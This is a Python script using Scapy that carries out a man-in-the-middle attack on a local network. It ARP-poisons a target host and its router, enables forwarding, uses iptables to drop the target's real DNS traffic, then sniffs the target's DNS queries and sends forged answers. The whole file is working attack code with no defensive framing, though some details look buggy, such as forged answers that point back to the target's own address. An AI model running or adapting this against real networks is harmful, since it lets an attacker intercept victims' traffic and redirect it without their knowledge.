#!/usr/bin/python3

import subprocess, os
from scapy.all import *

targetIP = "192.168.0.15"
routerIP = "192.168.0.16"
localIP = "127.0.0.1"

def setIptables():
    # Disable fowarding of DNS request to router
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    # Add iptables rule to drop any DNS request
    subprocess.Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def resetIptables():
    # Remoce iptables rule to drop any DNS request
    subprocess.Popen(["iptables -D FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def getLocalMAC(interface):
    mac = ""
    try:
        mac = open('/sys/class/net/' + interface + '/address').readline()
    except:
        mac = "00:00:00:00:00:00"
    return mac[:17]

def getTargetMAC(targetIP):
    pingResult = subprocess.Popen(["ping", "-c 1", targetIP], stdout=subprocess.PIPE)
    pid = subprocess.Popen(["arp", "-n", targetIP], stdout=subprocess.PIPE)
    s = pid.communicate()[0]
    targetMAC = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
    return targetMAC

def arpPoison(localMAC, targetMAC, routerMAC):
    arpPacketTarget = Ether(src=localMAC, dst=targetMAC)/ARP(hwsrc=localMAC, hwdst=targetMAC, psrc=routerIP, pdst=targetIP, op=2)
    arpPacketRouter = Ether(src=localMAC, dst=routerMAC)/ARP(hwsrc=localMAC, hwdst=routerMAC, psrc=targetIP, pdst=routerIP, op=2)
    print("ARP Poisoning {}".format(targetIP))
    while True:
        try:
            sendp(arpPacketTarget, verbose=0)
            sendp(arpPacketRouter, verbose=0)
            # sleep 3 seconds for each sending
            time.sleep(3)
        except KeyboardInterrupt:
            print("Stop ARP poisoning. Closed.")
            sys.exit(0)

def reply(packet):
    global targetIP
    response = IP(dst=targetIP, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
            DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=targetIP))
    send(response, verbose=0)
    print("Sent spoofed DNS packet")
    return

def parsePacket(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        replyThread = threading.Thread(target=reply, args=(packet, ))
        replyThread.start()

def listen():
    global targetIP
    print("Start sniffing DNS packets...")
    mFilter = "udp and port 53 and src " + str(targetIP)
    sniff(filter=mFilter, prn=parsePacket)

def main():
    setIptables()

    targetMAC = getTargetMAC(targetIP)
    localMAC = getLocalMAC("eno1")
    routerMAC = getTargetMAC(routerIP)

    arpThread = threading.Thread(target=arpPoison, args=(localMAC, targetMAC, routerMAC))
    arpThread.daemon = True
    listenThread = threading.Thread(target=listen)
    listenThread.daemon = True

    arpThread.start()
    listenThread.start()

    while True:
        try:
            time.sleep(5)
        except KeyboardInterrupt:
            resetIptables()
            print("Exiting...")
            sys.exit(0)

if __name__ == '__main__':
    main()
